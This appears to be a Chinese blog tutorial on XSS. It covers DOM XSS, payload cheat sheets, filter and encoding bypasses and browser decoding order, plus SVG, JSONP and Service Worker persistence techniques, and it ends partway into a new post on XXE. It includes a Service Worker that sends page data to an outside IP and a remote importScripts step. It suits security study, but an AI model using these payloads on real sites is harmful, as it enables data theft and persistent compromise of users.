一个HTML文档可以用一个DOM树简要表述，其描述了HTML文档中标签间的相互关联性。HTML文档被解析后即转化为DOM树，因此对HTML文档的处理可以通过对DOM树的操作实现，以改变文档的结构、样式或者内容。\n\r\n原理 本质上是一种特殊类型的反射型XSS，因为其数据并没有存储至服务端以持久化，而是通过JS操作DOM对象输出特定内容至页面。\n示例：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;DOM Based XSS Demo\u0026lt;/title\u0026gt; \u0026lt;script\u0026gt; function xsstest() { var str = document.getElementById(\u0026#34;input\u0026#34;).value; document.getElementById(\u0026#34;output\u0026#34;).innerHTML = \u0026#34;\u0026lt;img src=\u0026#39;\u0026#34;+str+\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;output\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;input\u0026#34; size=50 value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34;submit\u0026#34; onclick=\u0026#34;xsstest()\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 上述场景：用户输入一个图片地址，点击提交后会自动将该地址拼接至img标签中并嵌入div标签。\n攻击者输入：\ns\u0026#39; onerror=\u0026#39;javascript:alert(1) 即会触发img标签的error事件，随后触发xss代码进行弹窗。\n常用标签  script img/video/audio：\u0026lt;img src=\u0026rsquo;s' onerror=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026quot;\u0026gt;、\u0026lt;video src=\u0026rsquo;s' onerror=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026quot;\u0026gt; input：\u0026lt;input onfocus=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026rdquo; autofocus\u0026gt; details：\u0026lt;details open ontoggle=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026quot;\u0026gt; svg：\u0026lt;svg onload=alert(\u0026ldquo;xss\u0026rdquo;);\u0026gt; select：\u0026lt;select onfocus=\u0026ldquo;alert(1);\u0026rdquo; autofocus\u0026gt; iframe：\u0026lt;iframe onload=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;、\u0026lt;iframe src=\u0026ldquo;javascript:alert(\u0026lsquo;1\u0026rsquo;)\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; a：\u0026lt;a href=\u0026ldquo;javascript:alert(\u0026lsquo;1\u0026rsquo;)\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;、\u0026lt;a href=\u0026rdquo;\u0026rdquo; onmouseover=\u0026ldquo;alert(\u0026lsquo;1\u0026rsquo;);\u0026quot;\u0026gt;aa\u0026lt;/a\u0026gt; form：\u0026lt;form action=\u0026ldquo;javascript:alert(\u0026lsquo;xss\u0026rsquo;)\u0026rdquo; method=\u0026ldquo;get\u0026rdquo;\u0026gt;   在某些标签中嵌入脚本是无法执行的，例如：\n \u0026lt;title\u0026gt; \u0026lt;textarea\u0026gt; \u0026lt;xmp\u0026gt; \u0026lt;iframe\u0026gt; \u0026lt;noscript\u0026gt; \u0026lt;noframes\u0026gt; \u0026lt;plaintext\u0026gt;  上述标签需要闭合后，再引入其他标签。\n注：\u0026lt;script\u0026gt; 和 \u0026lt;style\u0026gt;标签不支持嵌套\n XSS常见绕过 关键字过滤  陌生标签代替 大小写绕过 双写绕过 字符拼接  \u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;a=`ale`;b=`rt`;c=\u0026#39;(`1`);\u0026#39;;eval(a+b+c)\u0026#34;\u0026gt; \u0026lt;script\u0026gt;window.top[\u0026#34;ale\u0026#34;+\u0026#34;rt\u0026#34;](\u0026#39;1\u0026#39;);\u0026lt;/script\u0026gt;  编码绕过：详见后续  空格过滤  /代替  \u0026lt;img/src=\u0026#34;x\u0026#34; onerror=\u0026#34;alert(\u0026#39;1\u0026#39;);\u0026#34;\u0026gt; 单双引号过滤  反引号``代替  \u0026lt;img/src=`x` onerror=alert(`1`);\u0026gt;  编码绕过  括号过滤  反引号``代替  \u0026lt;script\u0026gt;alert`1`;\u0026lt;/script\u0026gt;  编码绕过 throw语句绕过  \u0026lt;script\u0026gt;onerror=alert;throw \u0026#39;xss\u0026#39;\u0026lt;/script\u0026gt; # throw语句抛出异常(可以自定义)，alert接收异常并弹出 url过滤  url编码绕过 ip进制转换绕过 使用//代替http://  # linux环境下才可以 \u0026lt;script\u0026gt;window.location = \u0026#34;//www.baidu.com\u0026#34;;\u0026lt;/script\u0026gt;  使用中文句号  \u0026lt;script\u0026gt;window.location = \u0026#34;http://www。baidu。com\u0026#34;;\u0026lt;/script\u0026gt; XSS伪协议绕过 data伪协议：\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=\r\r\njavascript伪协议：\njavascript::alert('1')\r例子：\n\u0026lt;a href=\u0026quot;javascript:alert(2)\u0026quot;\u0026gt;a\u0026lt;/a\u0026gt;\r\u0026lt;object data=\u0026quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==\u0026quot;\u0026gt;\u0026lt;/object\u0026gt;\rXSS编码绕过 Unicode编码 Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。其使用两个字节表示一个字符。\nUnicode只是一种容纳世界上所有文字和符号的字符编码方案，具体存储实现有UTF-8、UTF-16、UTF-32。\nJavaScript编码：\n# 可以使用\\uxxxx 来表示一个字符的Unicode编码，例如'haha'：\r\\u0068\\u0061\\u0068\\u0061\rHTML实体编码：\n# \u0026amp;开头+预先定义的实体名称+;分号结束,例如'\u0026lt;':\r\u0026amp;lt;\r# \u0026amp;开头+#符号+字符在ASCII对应的十进制数字+;分号结束，例如'haha'：\r\u0026amp;#104;\u0026amp;#97;\u0026amp;#104;\u0026amp;#97;\r 注：字符都是由实体编号的，但有些字符是没有实体名称的\n URL编码：\n# 以'haha'为例：\r%68%61%68%61\r浏览器解码规则 编码方式有HTML实体编码、JS编码、URL编码，当浏览器解析HTML文档时又该以什什么样的方式和顺序对其进行解码呢？\n 当浏览器接收到HTML文档时，通过HTML解析器将HTML文档解析为DOM树，这一过程中完成HTML实体解码；在DOM树创建过程中，如果遇到js或css相关的标签，则会触发JavaScript和CSS解释器完成内联脚本的解析，这一过程完成JS的解码；如果浏览器发现存在URL环境，则也会引入URL解析器完成对URL的解码工作，URL解码顺序会根据URL所在位置不同(可能在JJS解析器之前或之后)而有所区别。但HTML解析总是最先进行。\n HTML解析过程 HTML有五类元素：\n 空元素(Void elements)，如：area、base、br、col、command、embed、hr、img、input、keygen、link、meta、param、source、track、wbr等 原始文本元素(Raw text elements)，如：\u0026lt;script\u0026gt;和\u0026lt;style\u0026gt; RCDATA元素(RCDATA elements)，如：\u0026lt;textarea\u0026gt;和\u0026lt;title\u0026gt; 外部元素(Foreign elements)，如：MathML命名空间或者SVG命名空间的元素 基本元素(Normal elements)，即除了以上4种元素以外的元素  五类元素的区别：\n 空元素：不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素：可以容纳文本。 RCDATA元素：可以容纳文本和字符引用。 外部元素：可以容纳文本、字符引用、CDATA段、其他元素和注释 基本元素：可以容纳文本、字符引用、其他元素和注释  HTML解析器从文档输入流中消耗字符并根据转换规则转变至不同状态(以状态机的方式运行)：\n\r\n引入示例：\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; hello,cool! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 解析过程：\n 初始状态为Data state，当消耗了\u0026lt;字符，状态转为Tag open state，消耗一个a-z的字符产生一个开始标签符号，状态转为Tag name state，保持该状态直到消耗至\u0026gt;字符，当中所消耗的每个字符都附加至这个符号名，例子中创建了html符号。 当消耗到z，当前符号完成，此时状态转回Data state，\u0026lt;body\u0026gt;重复这一处理过程。此时，html和body标签已经识别出来，当前状态已回到Data state，消耗hello,cool!中的字符h并创建一个字符符号，这个过程会为hello,cool!中的每个字符都生成一个字符符号。 直到遇到\u0026lt;/body\u0026gt;中的\u0026lt;，进入Tag open state，消耗下一个字符/将创建一个闭合标签符号，状态转为Close tag open state，继续消耗字符，此时状态已转为Tag name state，保持该状态直到遇到\u0026gt;。产生了一个新的标签符号并回到Data state。此后的闭合标签处理同上。   注：\nHTML解析器处于数据状态（Data state）、RCDATA 状态（RCDATA state）、属性值状态（Attribute Value state）时，字符实体会被解码为对应的字符。\n 示例：\n\u0026lt;div\u0026gt;\u0026amp;#60;img src=x onerror=alert(4)\u0026amp;#62;\u0026lt;/div\u0026gt;\r\u0026lt; 和 \u0026gt; 被编码为字符实体\u0026amp;#60; 和 \u0026amp;#62;。\r当HTML解析器解析完\u0026lt;div\u0026gt;时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体\u0026amp;#60;时，因为处在数据状态Data State，所以就会对实体进行解码为\u0026lt;，后面的\u0026amp;#62;同样道理被解码为\u0026gt;。\r在上述过程中当字符实体进行解码后只被视为字符引用，解析器在使用字符引用后不会转换到标签打开状态（Tag Open State），不进入标签打开状态就不会被发布为HTML标签。因此，img不会创建新HTML标签，只会将其作为数据来处理。这就是使用字符实体来避免用户不安全输入导致XSS的原因。\n特殊情况  原始文本元素  HTML中Raw text elements的标签有两个：script、style。在原始文本类型标签下的所有内容块都属于该标签。\nRaw text elements类型标签下的所有字符实体编码都不会被HTML解码。HTML解析器解析到script、style标签的内容块（数据）部分时，状态会进入Script Data state，该状态并不在前面说的会解码字符实体的三个状态之中。\n因此，该例子：\n\u0026lt;script\u0026gt;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#57;\u0026amp;#41;\u0026amp;#59\u0026lt;/script\u0026gt;\r中字符实体并不会被解码，也就不会执行JS。\n RCDATA  HTML中 RCDATA 的标签有两个：textarea、title。解析器解析到 textarea、title 标签的数据部分时，状态会进入 RCDATA State。处于 RCDATA State 状态时，字符实体是会被解析器解码的。\n示例：\n\u0026lt;textarea\u0026gt;\u0026amp;#60;script\u0026amp;#62;alert(5)\u0026amp;#60;/script\u0026amp;#62;\u0026lt;/textarea\u0026gt;\r\u0026lt;和\u0026gt;被编码为实体\u0026amp;#60;和\u0026amp;#62;。\r里面的JS同样还是不会被执行，还是因为解码字符实体状态机不会进入标签打开状态(Tag Open State)，因此里面的\u0026lt;script\u0026gt;并不会被解析为HTML标签，也就不会被执行\rJavaScript解析 形如 \\uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。\nJavaScript中有三个地方可以出现Unicode字符转义序列：\n 字符串中  Unicode转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。\n例如，\u0026lt;script\u0026gt;alert(\u0026quot;\\u0031\\u0030\u0026quot;);\u0026lt;/script\u0026gt;，被编码转义的部分为10，会被正常解码，JS代码也就会被执行。\n 标识符中  若Unicode转义序列存在于标识符中，即变量名、函数名等，它会被进行解码。\n例如，\u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u0026lt;/script\u0026gt;，被编码转义的部分为alert字符，属于在标识符中的情况，因此会被正常解码，JS代码也会被执行。\n 控制字符  若Unicode转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。控制字符即'、\u0026quot;、(、)等。\n例如，\u0026lt;script\u0026gt;alert\\u0028\u0026quot;xss\u0026quot;); \u0026lt;/script\u0026gt;，(进行了Unicode编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分，即alert(。\n因此函数的括号之类的控制字符进行Unicode转义后是不能被正常解释的。\n示例：\n\u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u0026lt;/script\u0026gt;\r被编码部分为alert(11)。\r该例中的JS不会被执行，因为控制字符被编码了。\r示例：\n\u0026lt;script\u0026gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u0026lt;/script\u0026gt;\r被编码部分为alert及括号内的12。\r该例中JS不会被执行，原因在于括号内被编码的部分不能被正常解释。要么使用ASCII码数字，要么加双引号或单引号使其变为字符串(就可以被解码)，作为字符串也只能作为普通字符。\r示例：\n\u0026lt;script\u0026gt;alert('13\\u0027)\u0026lt;/script\u0026gt;\r被编码处为'。\r该例的JS不会执行，因为控制字符被编码了，解码后的'将变为字符串的一部分，而不再解释为控制字符。因此该例中字符串是不完整的，没有'来结束字符串。\r示例：\n\u0026lt;script\u0026gt;alert('14\\u000a')\u0026lt;/script\u0026gt;\r该例的JS会被执行，因为被编码的部分处于字符串内，只会被解释为普通字符，不会突破字符串上下文。\r示例：\n\u0026lt;img src = \u0026quot;https://text.com\u0026quot; onclick = 'alert(\u0026quot;输入点\u0026quot;)'\u0026gt;\r开发人员单纯设置HTML实体编码为防御xss的手段，但是用户输入点在alert中\r如果用户正常输入的话凡是存在\u0026lt; ,\u0026quot; 等都能被转码，攻击者可以通过语句 \u0026quot;);alert(\u0026quot;test，在服务端被编码：\r\u0026lt;img src = \u0026quot;https://gss1.bdstatic.com\u0026quot; onclick = 'alert(\u0026quot;FIRST XSS\u0026amp;#34;\u0026amp;#41;\u0026amp;#59;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#34;\u0026amp;#116;\u0026amp;#101;\u0026amp;#115;\u0026amp;#116;\u0026quot;)'\u0026gt; 解码后弹窗两次，是因为浏览器进行HTML解码发现存在两个alert()\r对于这种情况，正确防御XSS的方法：应该是先JavaScript编码然后再进行HTML编码\r用户输入 \u0026quot;);alert(\u0026quot;test 后在服务端先JavaScript编码然后再进行HTML编码，在\r在浏览器端：首先经过第一步HTML解码后变为\\u0022\\u0029\\u003B\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0022\\u0074\\u0065\\u0073\\u0074，JavaScript解析器工作，变为 \u0026quot;);alert(\u0026quot;test ，而JavaScript解析时只有标识符名称不会被当做字符串，控制字符仅会被解析为标示符名称或者字符串，因此\\u0022被解释成双引号文本，\\u0028和\\u0029被解释成为圆括号文本，不会变为控制字符被解析执行。在这里采用的先JS编码后HTML编码中只弹窗了一次。\rURL解析 URL解析器也被建模为状态机，文档输入流中的字符可以将其导向不同的状态。\n URL的Scheme部分（协议部分）必须为ASCII字符，即不能被任何编码，否则URL解析器的状态机将进入No Scheme状态。\n 示例：\n\u0026lt;a href=\u0026quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\rURL编码部分的是javascript:alert(1)。\rJS不会被执行，因为作为Scheme部分的\u0026quot;javascript\u0026quot;这个字符串被编码，导致URL解析器状态机进入No Scheme状态。\r URL中的:也不能被以任何方式编码，否则URL解析器的状态机也将进入No Scheme状态。\n 示例：\n\u0026lt;a href=\u0026quot;javascript%3aalert(3)\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\r由于:被URL编码为%3a，导致URL状态机进入No Scheme状态，JS代码不能执行。\r示例：\n\u0026lt;a href=\u0026quot;\u0026amp;#x6a;\u0026amp;#x61;\u0026amp;#x76;\u0026amp;#x61;\u0026amp;#x73;\u0026amp;#x63;\u0026amp;#x72;\u0026amp;#x69;\u0026amp;#x70;\u0026amp;#x74;:%61%6c%65%72%74%28%32%29\u0026quot;\u0026gt;\r\u0026quot;javascript\u0026quot;这个字符串被实体化编码，:没有被编码，alert(2)被URL编码。\r成功执行。首先，HTML状态机处于属性值状态(Attribute Value State)时，字符实体时会被解码的，此处在href属性中，所以被实体化编码的\u0026quot;javascript\u0026quot;字符串会被解码。\r其次，HTML解析是在URL解析之前的，所以在进行URL解析之前，Scheme部分的\u0026quot;javascript\u0026quot;字符串已被解码，而并不再是被实体编码的状态。\r解析顺序示例  示例：\n\u0026lt;a href=\u0026quot;UserInput\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\r该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着 URL 解析器对 UserInput 进行 URL decode；如果 URL 的 Scheme 部分为 javascript 的话，JavaScript 解析器会再对 UserInput 进行解码。\n解析顺序：HTML 解析-\u0026gt;URL 解析-\u0026gt;JavaScript 解析\n  示例：\n\u0026lt;a href=# onclick=\u0026quot;window.open('UserInput')\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\r该例子中，首先由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 JavaScript 解析器会再对 onclick 部分的 JS 进行解析并执行 JS；执行 JS 后 window.open(‘UserInput’) 函数的参数会传入 URL，所以再由 URL 解析器对 UserInput 部分进行解码。\n解析顺序：HTML 解析-\u0026gt;JavaScript 解析-\u0026gt;URL 解析\n  示例：\n\u0026lt;a href=\u0026quot;javascript:window.open('UserInput')\u0026quot;\u0026gt;\r该例子中，首先还是由 HTML 解析器对 UserInput 部分进行字符实体解码；接着由 URL 解析器解析 href 的属性值；然后由于 Scheme 为 javascript，所以由 JavaScript 解析；解析执行 JS 后 window.open(‘UserInput’) 函数传入 URL，所以再由 URL 解析器解析。\n解析顺序：HTML 解析-\u0026gt;URL 解析-\u0026gt;JavaScript 解析-\u0026gt;URL 解析。\n XSS高阶利用方式 SVG下的存储型XSS 可缩放矢量图形(Scalable Vector Graphics，SVG)是W3C推出的基于XML的二维矢量图形标准。SVG可以提供高质量的矢量图形渲染，同时由于支持JavaScript和文档对象模型，SVG图形通常具有强大的交互能力。\n例子：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;no\u0026#34;?\u0026gt; \u0026lt;svg width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; version=\u0026#34;1.1\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;rect width=\u0026#34;100\u0026#34; height=\u0026#34;100\u0026#34; style=\u0026#34;fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)\u0026#34; /\u0026gt; \u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;);\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt; 存储型XSS：\n# 正常业务\r文件上传 -\u0026gt; 上传SVG图片 -\u0026gt; SVG图片存储至服务器\r# 利用\r嵌入XSS代码 -\u0026gt; 上传该SVG -\u0026gt; 用户访问该图片 -\u0026gt; 执行JS脚本\rSVG下的窃取Web Storage Web Storage是HTML5中本地存储的解决方案之一，但并不是为了取代cookie而制定的标准，cookie作为HTTP协议的一部分用来处理客户端和服务器通信是不可或缺的，session正是依赖于cookie实现客户端状态保持。WebStorage的意图在于解决本来不应该cookie做，却不得不用cookie的本地存储。\ncookie的缺陷：\n 数据大小：仅有4KB，无法满足复杂的业务需求 网络传输：cookie会附加在每个HTTP请求中，流量负担  Web Storage提供两种类型的API：localStorage和sessionStorage。localStorage在本地永久性存储数据，除非显式将其删除或清空，sessionStorage存储的数据只在会话期间有效，关闭浏览器则自动删除。两个对象都有共同的API。\n与cookie相比的优势：\n 容量上讲Web Storage一般提供5M的存储空间 安全性上WebStorage并不作为HTTP header发送   利用SVG盗取localStorage\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\r\u0026lt;svg version=\u0026quot;1.1\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; \u0026gt;\r\u0026lt;rect width=\u0026quot;100\u0026quot; height=\u0026quot;100\u0026quot; /\u0026gt;\r\u0026lt;script\u0026gt;\rif(localStorage.length)\r{\rfor(key in localStorage)\r{\rif(localStorage.getItem(key))\r{\rconsole.log(\u0026quot;key:\u0026quot; + key);\rconsole.log(\u0026quot;value\u0026quot; + localStorage.getItem(key));\r}\r}\r}\r\u0026lt;/script\u0026gt;\r\u0026lt;/svg\u0026gt;\r JSONP劫持 JSONP script标签是可以加载异域的JavaScript并执行的，并可以通过预先设定好的callback函数来实现和非同源页面的交互。\n某网站的客户端代码：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;JSONP 实例\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;divCustomers\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function callbackFunction(result, methodName) { var html = \u0026#39;\u0026lt;ul\u0026gt;\u0026#39;; for(var i = 0; i \u0026lt; result.length; i++) { html += \u0026#39;\u0026lt;li\u0026gt;\u0026#39; + result[i] + \u0026#39;\u0026lt;/li\u0026gt;\u0026#39;; } html += \u0026#39;\u0026lt;/ul\u0026gt;\u0026#39;; document.getElementById(\u0026#39;divCustomers\u0026#39;).innerHTML = html; } \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 服务端jsonp.php代码：\n\u0026lt;?php header(\u0026#39;Content-type: application/json\u0026#39;); //获取回调函数名 $jsoncallback = $_REQUEST [\u0026#39;jsoncallback\u0026#39;]; //json数据 $json_data = \u0026#39;[\u0026#34;customername1\u0026#34;,\u0026#34;customername2\u0026#34;]\u0026#39;; //输出jsonp格式的数据 echo $jsoncallback . \u0026#34;(\u0026#34; . $json_data . \u0026#34;)\u0026#34;; ?\u0026gt;劫持：\n修改https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction中jsoncallback这个参数值为\u0026lt;scrip\u0026gt;alert('1');\u0026lt;/script\u0026gt;，则输出至前端的数据为\u0026lt;scrip\u0026gt;alert('1');\u0026lt;/script\u0026gt;[\u0026quot;customername1\u0026quot;,\u0026quot;customername2\u0026quot;]。\n如果前端Content-Type未设置或者是text/html、application/json，则响应到客户端的内容就会触发执行JS脚本。\n持久化之Service Worker Service Worker技术基于web worker使得Web 应用离线缓存成为可能，更为后台同步、通知推送等功能提供了思路。\n该技术最核心的一个特性就是：Service Worker 工作线程独立于浏览器主线程，并且与当前的浏览器主线程完全隔离，并且可以用 JS 代码来拦截浏览器当前域的HTTP 请求。\n 它注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。能够完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。并且由于service worker工作于worker上下文，因此它不能访问DOM。\n  注意点：\n 只能注册同源下的js 网站必须是https://或者http://localhost/ Content-Type 为 */javascript Worker 线程不能获得下列对象：DOM对象，Windows对象，document对象，parent对象   Service Worker生命周期  install -\u0026gt; installed -\u0026gt; activating -\u0026gt; =active -\u0026gt; activated -\u0026gt; redundant\n 进入redundant (废弃)状态的原因可能是：\n 安装(install)失败 激活(activating)失败 新版本的 Service Worker 替换了它并成为激活状态  注册 navigator.serviceWorker.register(\u0026#39;/haha/test.js\u0026#39;,{scope:\u0026#34;/\u0026#34;}) Service Worker 的注册路径决定了其 scope (默认作用范围)。示例中的test.js 是在 /haha/ 下，这使得该 Service Worker 默认只会收到/haha/下的fetch 事件。如果存放在网站的根路径下，则将会收到该网站的所有 fetch 事件。\n如果希望改变它的作用域，可在第二个参数设置 scope 范围。\n安装 本地注册一个根目录下的Service Worker 脚本，作用域范围http://localhost:8000/：\n\r\nsw_test.js：\n//监控install事件 self.addEventListener(\u0026#39;install\u0026#39;, function(event){ console.log(\u0026#34;install\u0026#34;) }) //监控activate事件 self.addEventListener(\u0026#39;activate\u0026#39;, function(event){ console.log(\u0026#34;activate\u0026#34;) }) //监控fetch事件 self.addEventListener(\u0026#39;fetch\u0026#39;, function(event){ event.respondWith(new Response(\u0026#39;\u0026lt;script\u0026gt;alert(/xss/);\u0026lt;/script\u0026gt;\u0026#39;, {headers: {\u0026#39;Content-Type\u0026#39;: \u0026#34;text/html\u0026#34;}})) }) 刷新页面：\n\r\n无感外带信息 sw_test.js:\n//监听一个特定的url，如果是，则修改响应实现外带当前域的一些信息，例如document.cookie  self.addEventListener(\u0026#39;fetch\u0026#39;, function (event) { event.respondWith( caches.match(event.request).then(function(response){ console.log(fetch(event.request)); var url = event.request.clone(); if (url.url == \u0026#39;http://localhost:8000/mytest.js\u0026#39;){ return new Response(\u0026#34;\u0026lt;script\u0026gt;var httpRequest = new XMLHttpRequest();httpRequest.open(\u0026#39;GET\u0026#39;, \u0026#39;http://192.168.0.102:8888/\u0026#39; + document.doamin, true);httpRequest.send();\u0026lt;/script\u0026gt;\u0026#34;, {headers: {\u0026#39;Content-Type\u0026#39;: \u0026#34;text/html\u0026#34;}}) }else{ return fetch(event.request).then(function(response) { console.log(\u0026#39;Response from network is:\u0026#39;, response.url); return response; }, function(error) { console.error(\u0026#39;Fetching failed:\u0026#39;, error); throw error; }); } }) ) }); 访问mytest.js：\n\r\nCTF例子中的Service Worker 2020西湖论剑 hardxss\n参考：https://yanluow.github.io/2020/10/21/xss%E6%8C%81%E4%B9%85%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020hardxss/\n例子中重要的点：\n 通过iframe跨域在其他域(其他域设置了父域)执行js jsonp接口传入callback参数中：使用self.importScripts('vps_addr/test.js')引入外部js文件，用作service worker的逻辑处理 窃取GET数据：location.search;窃取POST数据：event.request.body  持久化之cookie 和 localStorage 网站有可能会将信息存储在 Cookie 或 localStorage ，而因为这些数据一般是网站主动存储的，且一般没有或很久没有对 Cookie 或 localStorage 中取出的数据过滤，而是直接展示在页面中。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。\n参考：\nhttps://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/xss/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/xss/","title":"XSS 相关"},{"content":"XXE漏洞 XXE(XML External Entity Injection)漏洞，全称XML外部实体注入。该漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件。\n危害：\n 文件读取 命令执行 攻击内网网站 ..  XML基础 定义 XML是一种类似于HTML的标记语言，但是 XML 没有使用预定义的标记。因此，可以根据自己的设计需求定义专属于自己的标记。这是一种十分有用的可存储、可搜索和可共享的格式存储数据的方法。\n跨系统或平台共享或传输 XML ，无论是在本地还是在互联网上，接收方仍然可以根据标准化的 XML 语法解析数据。\nXML设计宗旨是传输数据，而不是显示数据；HTML被设计用来显示数据。\n结构 XML文档包含XML声明、DTD文档类型定义(该部分可选)、文档元素三部分。\n示例：\n\u0026lt;!-- 声明信息 --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;message\u0026gt; \u0026lt;receiver\u0026gt;me\u0026lt;/receiver\u0026gt; \u0026lt;sender\u0026gt;somebody\u0026lt;/sender\u0026gt; \u0026lt;header\u0026gt;TheReminder\u0026lt;/header\u0026gt; \u0026lt;msg\u0026gt;This is an amazing msg\u0026lt;/msg\u0026gt; \u0026lt;/message\u0026gt; DTD DTD(Document Type Definition)，文档类型定义，通过定义DTD说明XML文档中有哪些模块以及各模块中有哪些内容。\n示例-定义内部DTD：\n\u0026lt;!-- 声明信息 --\u0026gt;\r\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!-- 定义内部 DTD --\u0026gt;\r\u0026lt;!DOCTYPE message [\r\u0026lt;!ELEMENT message (receiver ,sender ,header ,msg)\u0026gt;\r\u0026lt;!ELEMENT receiver (#PCDATA)\u0026gt;\r\u0026lt;!ELEMENT sender (#PCDATA)\u0026gt;\r\u0026lt;!ELEMENT header (#PCDATA)\u0026gt;\r\u0026lt;!ELEMENT msg (#PCDATA)\u0026gt;\r]\u0026gt;\r\u0026lt;message\u0026gt;\r\u0026lt;receiver\u0026gt;me\u0026lt;/receiver\u0026gt;\r\u0026lt;sender\u0026gt;somebody\u0026lt;/sender\u0026gt;\r\u0026lt;header\u0026gt;TheReminder\u0026lt;/header\u0026gt;\r\u0026lt;msg\u0026gt;This is an amazing msg\u0026lt;/msg\u0026gt;\r\u0026lt;/message\u0026gt;\r除了在DTD 中定义元素（对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容，也可类似声明变量)，例如某些内容是固定不变的。\n示例-定义实体：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE foo [\r\u0026lt;!ELEMENT foo ANY \u0026gt;\r\u0026lt;!ENTITY xxe \u0026quot;test\u0026quot;\u0026gt;]\u0026gt;\r\u0026lt;!-- ANY表示可接收任何元素；在这里定义了一个'xxe'的实体，其实可以看成一个变量，后续可以在 XML中通过 \u0026amp; 符号进行引用） 